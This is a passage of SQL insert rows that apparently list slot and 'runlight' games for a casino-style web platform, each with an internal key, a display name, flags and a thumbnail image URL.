(76, 'slot_safariheat', 'Safari Heat', 'singleplayer_games', 'slot', '1', '1', 'http://scr8-cdm.s3.amazonaws.com/agency/win8club/product/gimg/_gimg_6iu6HZwZzo49AaBmO00wLERfyuKXGPB309rTAqUFnzCmNb716svUmGKUNUT4UsyfdwDMhdCMsJkH3hfSqVEw1w==.jpeg', 'Safari Heat', 0, 0),
(77, 'slot_wildfox', 'Wild Fox', 'singleplayer_games', 'slot', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_rjFeqZuisTmY1v9Dr8fuswafxfb6sOp4NV9n5LczgWko9Uiwc8XKk3nTRcF6WOj4tHju7BTVJWwpbLQmpiNoeg==.jpeg', 'Wild Fox', 0, 0),
(78, 'slot_indianmyth', 'Indian Myth', 'singleplayer_games', 'slot', '1', '1', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_YLHmcZfcjm17segFVUmTeiYCzitVkELs0tDXcESNNlINVAqwxAWtTziD6mrwsWgDKYJdznjx3rTNrE9qFuO5QA==.jpeg', 'Indian Myth', 0, 0),
(79, 'slot_anightout', 'A Night Out ', 'singleplayer_games', 'slot', '1', '1', 'http://scr8-cdm.s3.amazonaws.com/agency/testing/gimg/_gimg_zId36cfPiHrhIQdOhVSuKrDyhSRzrupbswpwtzWjk0Z8EiLJQqCW3Fg8VueZPzGQrEPM1ZMYFNyH44EKPzP0NA==.jpeg', 'A Night Out ', 0, 0),
(80, 'slot_godofwealth888', 'God Of Wealth', 'singleplayer_games', 'slot', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_6FHr1nmQZWrDSFmWHDppGbMZT7UtasGqcQMZzzD2yHXwkMEapAMEYh0zPZlYlst6xD25B2ucaIcgpjk6Jx3p9g==.jpeg', 'God Of Wealth', 0, 0),
(81, 'slot_panjinlianplus', 'Pan Jin Lian Plus', 'singleplayer_games', 'slot', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_0sdCr7taBkbia7s6DGQlKosdKdkoMpvxoW8CAAcV14ZQGSEpQjRkEnBVy1pgo6XG8S0NKRb0hr7PoTNb3nhvLw==.jpeg', 'Pan Jin Lian Plus', 0, 0),
(82, 'slot_88fortunes', '88 Fortunes', 'singleplayer_games', 'slot', '1', '1', 'http://scr8-cdm.s3.amazonaws.com/agency/skycc8/product/gimg/_gimg_eL9btaeKhixgRGnJ9wkrlqozEwq5yr7g3Lsf276hFyVhBe6NeMj27xSigG7K5YAzaW1xAIIGDfaCR53YB4ys9Q==.jpeg', '88 Fortunes', 0, 0),
(83, 'slot_watermargin', 'Water Margin', 'singleplayer_games', 'slot', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_zAIwNPq1SSEi6vWAL8JHrSBRGf8ZMOkN2wcuEjeO4PtU9PSNygtEpl0t4pD3IGOayfKLyRGT2YdcPP3PggxdmA==.jpeg', 'Water Margin', 0, 0),
(84, 'slot_huaguoshan', 'Hua Guo Shan', 'singleplayer_games', 'slot', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/staging/gimg/_gimg_vLm2KZjnBOl1BQdmAMxGHEsNygfIXFXnpmhtG3d15vWjtArnDbv8aI7PIfxqH7y4knFiyKCqbt9VciEaXIY0xQ==.jpeg', 'Hua Guo Shan', 0, 0),
(85, 'slot_theluckystar', 'The Lucky Star', 'singleplayer_games', 'slot', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_34KgFYyV6UaXrh8pqipsJcTW0BVuw2QRcLM6YQlfii3Y0ohrb9xs8kE6g0TdANpY1hlTbfk7zrPKEX0yRrMCjQ==.jpeg', 'The Lucky Star', 0, 0),
(86, 'slot_panjinlianplus3', 'Pan Jin Lian Plus 3', 'singleplayer_games', 'slot', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/agency/testing/gimg/_gimg_Fpfc4b2Tmhx9ewqiKtnGWbGiW3OHGrrW4jn8veEfEpnqBZGLVb3DfMCBPnSJXSg9vflS75d00SyREwYUj0SQTg==.jpeg', 'Pan Jin Lian Plus 3', 0, 0),
(87, 'slot_morehard', 'More Hard', 'singleplayer_games', 'slot', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_f2ysI3mjbiEJ4PZWRaUJNMSbdZ4vBIPpbBWSIGyVRr6tTa2vKvyiR6SUmvcACUkhAxStAlKo84Pc2qlkoFoJyw==.jpeg', 'More Hard', 0, 0),
(88, 'slot_thedemongirl', 'The Demon Girl', 'singleplayer_games', 'slot', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_A0N5i2Cp60KEYoP7xh5DsgYVGy4owlsGQjqHP27yEdt0nhtadrTXhXYiWLJipoHWjeNOpOGE0mnBCGHDswaMZg==.jpeg', 'The Demon Girl', 0, 0),
(89, 'slot_theyoukaiclub', 'The Youkai Club', 'singleplayer_games', 'slot', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_M1ffuPMZHifyLSbvI7iOvQXO8YgcYXkuWO5OhrPoaN9H5pSixJ6bWMOzNWPVqhEPYpRytV2QvP8p8PSbIz305w==.jpeg', 'The Youkai Club', 0, 0),
(90, 'slot_tsubomi', 'Tsubomi', 'singleplayer_games', 'slot', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_fNIXBav44xP4bUgNOWmemjyc6lewtOmzJRMtfAkS9dpLPZ0uuXvLyQwrZP3S2Vc8HRlQ6zZasWgLBkzWPmhTHw==.jpeg', 'Tsubomi', 0, 0),
(91, 'slot_wifeandmama', 'Wife And Mama', 'singleplayer_games', 'slot', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_2esrcUmwBf7FERDGnPvEW4RDOJbyMctZRaktwGbP2Mzad9qFb8om6mcOpODhrCiOX3aqFhEh8OErD21ygdDiaQ==.jpeg', 'Wife And Mama', 0, 0),
(92, 'slot_hotseven', 'Hot Seven', 'singleplayer_games', 'slot', '1', '0', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_JHbnEaH2AK6MNlYpbeyBDz0N8QzBYSONZAUn4MzTcnY6sxoEDxyazbrSoWyu2Vqt1WFwmAVx1DhjmubjhtJd1Q==.jpeg', 'Hot Seven', 0, 0),
(93, 'slot_caishenriches', 'Cai Shen Riches', 'singleplayer_games', 'slot', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/agency/testing/gimg/_gimg_0x9PPrnrfOpvoCRtakibJvsWmq1T93vWpPf2v4KsAfm46PHjK46N31536mBECJcR6fZx4nRv3ndikY7COMTubw==.jpeg', 'Cai Shen Riches', 0, 0),
(94, 'slot_goldenmonkey', 'Golden Monkey', 'singleplayer_games', 'slot', '1', '1', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_IpP0FiKuit8XPCskd0HcDrGjhzhxCaLn7wA2S5Ii1nC9IF1pa0SSrfAx2DrSSve11BuCrUDE5ita2zYyU7miIg==.jpeg', 'Golden Monkey', 0, 0),
(95, 'slot_beanstalk', 'Beans Talk', 'singleplayer_games', 'slot', '1', '1', 'http://scr8-cdm.s3.amazonaws.com/agency/testing/gimg/_gimg_phlj2eP5oWW4Qg9jozdKmOVap2O144h4mJ5i7xlBOC9zFd9qtW8Pi95DSqbGe11246bnvw5uWdQ7zazB3P581A==.jpeg', 'Beans Talk', 0, 0),
(96, 'slot_fourdragon', 'Four Dragon', 'singleplayer_games', 'slot', '1', '0', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_QzpxaPYzuWcnEot36hnSKyvEh4EJpfMNRpqPmERxlz6QCVX9P7WqWDbpRIz9eEKvjfF8eX151EupusAJkdjA3g==.jpeg', 'Four Dragon', 0, 0),
(97, 'slot_enterthektv', 'Enter The Ktv', 'singleplayer_games', 'slot', '1', '0', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_GpY5Nhv5x6VXG7LuolblbqLmbcdqbfwy8mWlp92srkfHpDQCAerR9clfAcVLvXBikHKBYQSw4XxUScvvDJa6Uw==.jpeg', 'Enter The Ktv', 0, 0),
(98, 'slot_godofwealth2', 'God Of Wealth 2', 'singleplayer_games', 'slot', '1', '1', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_k2mlqrbIbhX8swajPtISN06uT3TRKpjyRK2Jx8llwEzl7Ww4IWSSjw5qTiEQMWPKHlIvzpU68cwp8VRaCAm2jw==.jpeg', 'God Of Wealth 2', 0, 0),
(99, 'slot_jungleisland', 'Jungle Island', 'singleplayer_games', 'slot', '1', '1', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_a7Gxyk7shcxfBbft86ZIvJwiqsFOBpqQYjiMsQRFogQkoOE5oVERoFjJRKL4ljiR07ynpMQoiQgcg4Yqctc2tw==.jpeg', 'Jungle Island', 0, 0),
(100, 'slot_robinhood', 'Robin Hood', 'singleplayer_games', 'slot', '1', '1', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_aaiQk7iXHrYkfSyBfdJCNrUNsfOUpHPegMkRFi65Yzmyiy4gasKWssDJVLrM30DTS45xXo1odiAHRoHMabRCQg==.jpeg', 'Robin Hood', 0, 0),
(101, 'slot_safarilife', 'Safari Life', 'singleplayer_games', 'slot', '1', '1', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_af6ssMNoghSkWsLF7RUQ7Jz5vqBaLkByDv55vle5ZBvVpxbDG8oegRSQ9ApQsLNpJbsQeyvV4Lrm74h92Bmq3A==.jpeg', 'Safari Life', 0, 0),
(102, 'slot_huga', 'Huga', 'singleplayer_games', 'slot', '1', '1', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_yhuTiD4EqU4QK2Qcc0calggn5tb9l7fbgudAg3pnJqZQNPqBO3A05EHUaf3SpGf2K4lEpeU1DPJKOeQmwJKRpg==.jpeg', 'Huga', 0, 0),
(103, 'slot_ageofgoldenape', 'Age of Golden Ape', 'singleplayer_games', 'slot', '1', '1', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_IyU0RqXUu9xOH7eWI06UkhptE21CWQ1VxJv6R466QkAnlz4nV4vkCqqNwwwKxduiy6WnkINasbwT6fyMHtTLIQ==.jpeg', 'Age of Golden Ape', 0, 0),
(104, 'slot_brucethelegend', 'Bruce The Legend', 'singleplayer_games', 'slot', '1', '0', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_NPh38RYxEE4ddZ4WOuMlO4fm3ZMbFjpCXeAif9U3cKVQWH97jdVT817mP4BKSGP6wpMSRIKBFZQEbvamhr8kvg==.jpeg', 'Bruce The Legend', 0, 0),
(105, 'slot_classicdiamond', 'Classic Diamond', 'singleplayer_games', 'slot', '1', '1', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_2JuhekhNP6QgyDyt1UubI3NhpYwPh05ryzjYfAJ2d8E0YZ5uUIPxpQSjmCjJQNodCqO02HglZjSj9672vVisFQ==.jpeg', 'Classic Diamond', 0, 0),
(106, 'runlight_dragoninthesky', 'Dragon In The Sky', 'singleplayer_games', 'slot', '1', '0', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_sftbDfA4TSmEQrUzRq8eH66BzgkoTwxZtmvg6PceTwdL3KYdca2Fn4d5ekd0kr4AX7gJ4ZLYOzy1w3RBd0djLA==.jpeg', 'Dragon In The Sky', 0, 0),
(107, 'slot_miami', 'Miami', 'singleplayer_games', 'slot', '1', '1', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_xQW9fVlntABYHiZs0Uf1DkEB6Kpo8r1toEGqPVvwOawYttRnlgZ1M3gk9yrzHRiu1W4u2Hudzq9Kmn96V6yDrw==.jpeg', 'Miami', 0, 0),
(108, 'slot_cloverstales', 'Clovers Tales', 'singleplayer_games', 'slot', '1', '0', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_KLvdANtUXM87x3Hy5qyQACioKSEd0XcYBGGF4s0doIt3vCjtcB87hu9ZcZfHTMpStSgYrLGUlmhfPoy75ZVS1g==.jpeg', 'Clovers Tales', 0, 0),
(109, 'slot_dreamofamerican', 'Dream of American', 'singleplayer_games', 'slot', '1', '0', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_2VBhhaJE784upx2ahuIubpShYZz1FOxJqsY9wFTBS7dPlqSOFEtvYDL3MtWMpoQdzthPEPMyP1dE0U7BcoPGdg==.jpeg', 'Dream of American', 0, 0),
(110, 'slot_tankattack', 'Tank Attack', 'singleplayer_games', 'slot', '1', '0', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_3MakwhOWSU3rfaHpUEFD1L3JygoiU3t9pqnrgwjhlX3GU83tjaUjcDxhYQsIhDWADSZYsD4oKgzZqgiAdwdoAg==.jpeg', 'Tank Attack', 0, 0),
(111, 'slot_ancientegypt', 'Ancient Egypt', 'singleplayer_games', 'slot', '1', '1', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_p0iXc3Ec3NAG4NmvWQ95vo21rgc9JBeLDF0rJUtNEJgm70he7nzE70MlvWygTsbHXioPaH0KM7MrV9eMWtqfmw==.jpeg', 'Ancient Egypt', 0, 0),
(112, 'slot_moneybangbang', 'Money Bang Bang', 'singleplayer_games', 'slot', '1', '1', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_qGinwSnpnkV6CHrKRmSygHmQrgqx7Yr8OaRpCIH7aklW04wzHZM36BmJhYzwqKhLJKHj94LBhOZF6nRAJqlkYg==.jpeg', 'Money Bang Bang', 0, 0),
(113, 'slot_whitesnake', 'White Snake', 'singleplayer_games', 'slot', '1', '1', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_6dSov55qoU9eBuKdcbCbMZU8uJS9rHDfGv4kUxaD6I1PtNv9UlklP5Od9BXbZ0H1LryW6iWF8PluYPACVGgwHQ==.jpeg', 'White Snake', 0, 0),
(114, 'slot_fairymoongoddess', 'Fairy Moon Goddess', 'singleplayer_games', 'slot', '1', '1', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_tXs5X8G5FvnAHzoY5zGAa27nMqtiKvDQFmkh7qi537lRY6zrrAPwtrFCz7a8n701ZRsvAImBtkWwt7eAF2coZA==.jpeg', 'Fairy Moon Goddess', 0, 0),
(115, 'slot_guardiansofflowers', 'Guardians Of Flowers', 'singleplayer_games', 'slot', '1', '0', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_yxEo2ClyRVLZ7kii33cWspjQ1uPqZRw8cwGibSicDVUid2yWoLae6WkuGzxnkPDhWWxxfCtcrsxZ5lHlrvTY3Q==.jpeg', 'Guardians Of Flowers', 0, 0),
(116, 'slot_dashinginferno', 'Dashing Inferno', 'singleplayer_games', 'slot', '1', '1', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_f1U6No5mWQeoM7AI1wZFY9AyW1bT0HWlgv51RJ6zlK0kW5UxuaLZzYlEfPVYIhUGxNHZQaWqaoYYX179q2QVmA==.jpeg', 'Dashing Inferno', 0, 0),
(117, 'slot_evilkingox', 'Evil King Ox', 'singleplayer_games', 'slot', '1', '0', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_vsffosbWzbUAidD5B55AkhK479oAQvliuHlRZXMIpX8kvHDH0EJA13i5vblQNKksPX5hUoF2B9KlBQpprENS3g==.jpeg', 'Evil King Ox', 0, 0),
(118, 'runlight_animalpark', 'Animal Park', 'singleplayer_games', 'runlight', '1', '0', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_8JF5yX6DWIYoubBXeCnfnaYhOEKAaLeqJHP7lA7dTYu4VEiupsTkNN5pkP00HI4dNx0h9BHWxUWuZlGdrE1dtg==.jpeg', 'Animal Park', 0, 0),
(119, 'runlight_sportcar', 'Sport Car', 'singleplayer_games', 'runlight', '1', '0', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_amrhoxsWHqmIuU0sKaDzypp9ckoafL6FaT8pgBxbrCm6RX7FB6GQwJD6tRIFrXk8QvW0jQjO7xgYxRQkiZyzXQ==.jpeg', 'Sport Car', 0, 0),
(120, 'slot_happyparty', 'Happy Party', 'singleplayer_games', 'slot', '1', '1', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_3EmRptNTRQ0H1kx5x7SLOGaoGsVgXoTEGR1GTAfYdJrKAiv9k9fqYOREzISNSV48w1Zci240i4uSEqRF7NemAg==.jpeg', 'Happy Party', 0, 0),
(121, 'slot_oceantrouble', 'Ocean Trouble', 'singleplayer_games', 'slot', '1', '1', 'https://media.eggsbook.com/mini-game/ocean-trouble.png', 'Ocean Trouble', 1, 1),
(122, 'slot_justicebao', 'Justice Bao', 'singleplayer_games', 'slot', '1', '0', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_q7whByY60WW07xZywU5u7khM99U3MrG3HniLYmj4GAZSOxj2TCCds8PW33lsB6Seqtn3lOW2esSmWsAMmRdUag==.jpeg', 'Justice Bao', 0, 0),
(123, 'slot_fulai', 'Fu Lai', 'singleplayer_games', 'slot', '1', '1', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_0Dhd374qVrLasFWGPf5XzI2n5F8UfO4WRTPxqOuidFO5T9ILizoQZzymjB9nR43GONJHcfsmmJI1wv70Qbofeg==.jpeg', 'Fu Lai', 0, 0),
(124, 'slot_godofthree', 'God Of Three', 'singleplayer_games', 'slot', '1', '1', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_HWdASEWaOeUSgYW3IBv04XOCh7JOyGAKihq01eiIQzk69xw6dH44rqIHCJZ9hHmvjFgbyGFsG92duzinhILk6A==.jpeg', 'God Of Three', 0, 0),
(125, 'slot_jinglewinnings', 'Jingle Winnings', 'singleplayer_games', 'slot', '1', '0', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_xjlZpJgvTrc8hrFSZM2bGAKLffg4hCKHA8gZQfVvcoWPTDbuYtqCWo9kl0H2tKvcPxaupTVr6yTuVj5PH28Z2w==.jpeg', 'Jingle Winnings', 0, 0),
(126, 'slot_luckyfortune', 'Lucky Fortune', 'singleplayer_games', 'slot', '1', '1', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_YGxnE139phj82gOQr15YLTBV3atKW6WiEOOS58xKIrAcWKRouwjFXUdG4bReb2mQLwYbGKJN0cxGRrlRm1VJZg==.jpeg', 'Lucky Fortune', 0, 0),
(127, 'slot_mysterylakeofpearl', 'Mystery Lake of Pearl', 'singleplayer_games', 'slot', '1', '1', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_dfD6B8IFVUYS7NbKFNolSKINGPhpSeXF6G1g2Ezh6NEONeyNeZtwkhnoW5gyE0avxVs5o5Dak2M795hwDwXlSA==.jpeg', 'Mystery Lake of Pearl', 0, 0),
(128, 'slot_phantomisland', 'Phantom Island', 'singleplayer_games', 'slot', '1', '1', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_hIQCmBF9JY8d3NzwJxze1MGlCNj4XB2AsJHKRiQBE04qpg5J5Hl8zzWY4LAR5NgYBY7CwxlsaZWCQwVm9kCbYQ==.jpeg', 'Phantom Island', 0, 0),
(129, 'slot_outlawedgunslinger', 'Outlawed Gunslinger', 'singleplayer_games', 'slot', '1', '0', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_XzfxOy0dJzHehfkGboaFIqbLzWFSx9VuFAmp0fSfs4dmrdmOOxGal3Cl1xqT4X1Mf6jcbtgKFRP7vZsAoJ4PFg==.jpeg', 'Outlawed Gunslinger', 0, 0),
(130, 'slot_queenfemida', 'Queen Femida', 'singleplayer_games', 'slot', '1', '0', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_ngxgYYH3kPFBZgTioLnL56DBmQ1sSQ4ORP4odzYtM6HCPt6XE0FbBWv63xQP62Gms5c73EamGLcVdmR6TMS6jw==.jpeg', 'Queen Femida', 0, 0),
(131, 'slot_themajestictaj', 'The Majestic Taj', 'singleplayer_games', 'slot', '1', '1', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_bJ1AhLKzKKDiUujdC6mePfpvryTP6ZdVaeuCdVHO3Ep1l2lPEFQSttBHI54u8WwE1QEhhUZo59gJejMU3OBVLg==.jpeg', 'The Majestic Taj', 0, 0),
(132, 'slot_samuraisensei', 'Samurai Sensei', 'singleplayer_games', 'slot', '1', '1', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_gQu6SuhXBsX4q9tvViOkGl0bo6KKukOzwy6CxSERbZt39V7oxIhZGzh5dfXeFMqrq40W2rab9y3nLEvrpSkcAw==.jpeg', 'Samurai Sensei', 0, 0),
(133, 'slot_midnightcarnival', 'Midnight Carnival', 'singleplayer_games', 'slot', '1', '1', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_NWnNYnLESYiYKtTA6EwJmhVqK7aOhR3vD6xq2kXx2jUrikRNyEIDCllQXIZhxi12rZiktp5lpSo7Y0Mfnim8xA==.jpeg', 'Midnight Carnival', 0, 0),
(134, 'slot_samuraiheroes', 'Samurai Heroes', 'singleplayer_games', 'slot', '1', '1', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_wxVKlOvxyFTfhgDfC9cgEFkphT6Wu7bckYH1LSyPwJMTpq3bukWHlb8LNGFEzl8dTHedl9YPPBKnDK9fLG8yVA==.jpeg', 'Samurai Heroes', 0, 0),
(135, 'slot_spiritbear', 'Spirit Bear', 'singleplayer_games', 'slot', '1', '0', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_0qZV2mAsxWq5iYBSFBvJTE6W0JmGtzhJxp4iQPer9VuH4wK2lsRtV8uiWiTknO96J3u1AO7dsBgf1m3l9sgOyw==.jpeg', 'Spirit Bear', 0, 0),
(136, 'slot_themythicalunicorn', 'The Mythical Unicorn', 'singleplayer_games', 'slot', '1', '0', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_R9awZ0IIJu2LuEsPMNlTCc7wo6LjB7BRSmAIQY9hRENye8FZVycE1ujEEJytQ6q6lVAit0tXw5U3DS9lLyDTjw==.jpeg', 'The Mythical Unicorn', 0, 0),
(137, 'slot_burningpearl', 'Burning Pearl', 'singleplayer_games', 'slot', '1', '0', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_3hDsRjQvWN2SPxikYbV14A9XJvsC0mbq9FDGr9AKgPycjyVKuaQ9GUHcY04ZUPfizxUoyVwtnmZZoPKAFMLfIA==.jpeg', 'Burning Pearl', 0, 0),
(138, 'slot_bushidoblade', 'Bushido Blade', 'singleplayer_games', 'slot', '1', '0', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_O4jRS7ToJ8ytY6ySzx9whGZtzFfUmEYfS6LuhUYbrVOs5QK4hVrVRQFIbReQxprNqmCA8HvYY8qjrtb7tgFofw==.jpeg', 'Bushido Blade', 0, 0),
(139, 'slot_ancientartifacts', 'Ancient Artifacts', 'singleplayer_games', 'slot', '1', '0', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_lzxfBGbsyUYMzD6YCRz9FapzHaPEpH1nBFr3t4Uc0fbTqj4J57BE2M6Dux5Ev9EyhTZLLNeEDIR0hvrnBHWK4Q==.jpeg', 'Ancient Artifacts', 0, 0),
(140, 'slot_dolphinpearl', 'Dolphin Pearl', 'singleplayer_games', 'slot', '1', '0', 'https://media.eggsbook.com/mini-game/dolphin-pearl.png', 'Dolphin Pearl', 1, 1),
(141, 'slot_columbus', 'Columbus', 'singleplayer_games', 'slot', '1', '0', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_UyKgiiE1JI30vH1z4UQQvdhnwHUvLeTabUydEL5RISz3oqX12a7R1U5VUjnWjgtupXccmxnhwrMCWSzkc2wjOg==.jpeg', 'Columbus', 0, 0),
(142, 'slot_treasuresinvarna', 'Treasures In Varna', 'singleplayer_games', 'slot', '1', '0', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_GDT3wdxGUVq0ktBK07woimvzU6SDb94ZiZfaLc2t1rv0AX2E6hmmAq6CvELYRUXCjZ1l8lqdg7vHzPw6mqk1hg==.jpeg', 'Treasures In Varna', 0, 0),
(143, 'slot_sexybeachparty', 'Sexy Beach Party', 'singleplayer_games', 'slot', '1', '1', 'https://media.eggsbook.com/mini-game/sexy-beach-party.png', 'Sexy Beach Party', 1, 1),
(144, 'slot_geisha', 'Geisha', 'singleplayer_games', 'slot', '1', '0', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_Az2z3kE10F1nTUIBh1PTlcPoPQPUzx9NKbTsij5Q2oib2Z3MgX7wUcNQa5n9X4F4gH1svFgXjE49naVIXtuXwg==.jpeg', 'Geisha', 0, 0),
(145, 'slot_bookofra', 'Book of Ra', 'singleplayer_games', 'slot', '1', '0', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_rdE5z3BksRPiIRBrzzzALZLcDrt1oh6AwcoJaX6eNEHQ33BstkJ1hwgAGVPVVbZu55L69cI9tvqIqDy72H5yxw==.jpeg', 'Book of Ra', 0, 0),
(146, 'slot_neptunetreasure', 'Neptune Treasure', 'singleplayer_games', 'slot', '1', '0', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_VdS815YHIf936NOH3iGjYd1YvhjkEaRbnRcIRWsgYeDXRfNVzRjfn9si2YVSJzIC1G5aCQnl2pAYyxNxdEnB7g==.jpeg', 'Neptune Treasure', 0, 0),
(147, 'slot_luckyladycharm', 'Lucky Lady Charm', 'singleplayer_games', 'slot', '1', '0', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_aNxzmdg8ofJiYvv5UegMLJQpjRMiLBKzZVJwOxjKbjGOntl2XqveGzveIUOuffnqIl7UWolq7LXEj9cBtUmwuQ==.jpeg', 'Lucky Lady Charm', 0, 0),
(148, 'slot_lordoftheocean', 'Lord of The Ocean', 'singleplayer_games', 'slot', '1', '1', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_xYdkFZFiEbaEvhSAzQmwfkoWkFReDemRAr9wzgFMCRL5rIVNgGlBpXyPtII6ijkvH17znBmrf6miNVNgqcNYew==.jpeg', 'Lord of The Ocean', 0, 0),
(149, 'slot_dynamitereels', 'Dynamite Reels', 'singleplayer_games', 'slot', '1', '0', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_apYBhJTm9oaaj1kGzSVP8H6y3VowKwexbUNBNPi880gyhacdonBiKkmQpWdCy2bavfS3zZWxqfWRHSPmI1RmIw==.jpeg', 'Dynamite Reels', 0, 0),
(150, 'slot_luckyrooster', 'Lucky Rooster', 'singleplayer_games', 'slot', '1', '0', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_uQ1w5IJN3CwvbQLTABvUBlm55iEAH02yoZfyPbmQvTgte5xLA1hzLZ0dH6KdtQtXW0OQgRvFCBn5e4t71xO0sQ==.jpeg', 'Lucky Rooster', 0, 0),
(151, 'slot_horuseye', 'Horus Eye', 'singleplayer_games', 'slot', '1', '0', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_TmPStW1zwFvyStTx6CD2gsD1wdy6C1WPNFkJLKqplfurbLA6AclhmekafzFlXAoPq9ihfjCKSa08C7Tmm5RfyA==.jpeg', 'Horus Eye', 0, 0),
(152, 'slot_queenofthenile', 'Queen of The Nile', 'singleplayer_games', 'slot', '1', '0', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_JmWKWDGdEnUwNj1gOrmWKbCafDKS3nZcnklQM65azTEspqarxoe0XPzMDpwNoANjWo7JboQ2n1zAGbXw4wfNpQ==.jpeg', 'Queen of The Nile', 0, 0),
(153, 'slot_archer', 'Archer', 'singleplayer_games', 'slot', '1', '1', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_LZEL31PdNGS2xUtIZPicRbulmhvSwsyu2VgubB3aPLLlLB622seOm14Jz8kyLjRadZdRbptzTVZ1qXAIA3KD5w==.jpeg', 'Archer', 0, 0),
(154, 'runlight_monkeystory_syncres', 'Monkey Story Synchronize', 'singleplayer_games', 'runlight', '1', '0', 'http://scr8-cdm.s3.amazonaws.com/product/gimg/_gimg_PP8IOzMf907JUVLvjbPQmsOCGpuVLyMIp8NtNMaEf2SwI46DjB83OD7U3r22lAiYTBVQ5FN2XnIRa1bhdTwuKQ==.jpeg', 'Monkey Story Synchronize', 0, 0),
(155, 'runlight_dragoninthesky_syncres', 'Dragon In The Sky Synchronize', 'singleplayer_games', 'runlight', '1', '0', 'https://scr8-cdm.s3.amazonaws.com/webgame/product/gimg/_gimg_g1n9erX6FDnOKxGaH3dxYqxumoiWKQMQPYjdw7O1O2yjah0zjxf3zFLvGmOg8XoEOvef4o5MTNtJoeBqjHoAbA==.jpeg', 'Dragon In The Sky Synchronize', 0, 0),
